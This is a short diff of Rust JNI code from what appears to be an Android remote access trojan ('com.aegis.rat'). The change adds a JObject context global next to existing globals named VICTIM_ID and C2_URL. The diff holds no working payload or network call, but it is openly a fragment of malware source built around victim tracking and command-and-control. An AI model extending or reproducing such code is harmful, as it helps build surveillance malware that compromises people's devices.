@@ -4,6 +4,7 @@ use jni::sys::{jstring, jboolean, JNI_TRUE};
 use once_cell::sync::Lazy;
 use std::sync::Mutex;
 use tokio::runtime::Runtime;
+use jni::objects::JObject;
 
 mod comms;
 mod sysinfo;
@@ -16,6 +17,7 @@ static RUNTIME: Lazy<Mutex<Option<Runtime>>> = Lazy::new(|| Mutex::new(None));
 static VICTIM_ID: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
 static C2_URL: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
 static DEVICE_INFO: Lazy<Mutex<Option<sysinfo::SystemInfo>>> = Lazy::new(|| Mutex::new(None));
+static CONTEXT: Lazy<Mutex<Option<JObject>>> = Lazy::new(|| Mutex::new(None));
 
 #[no_mangle]
 pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
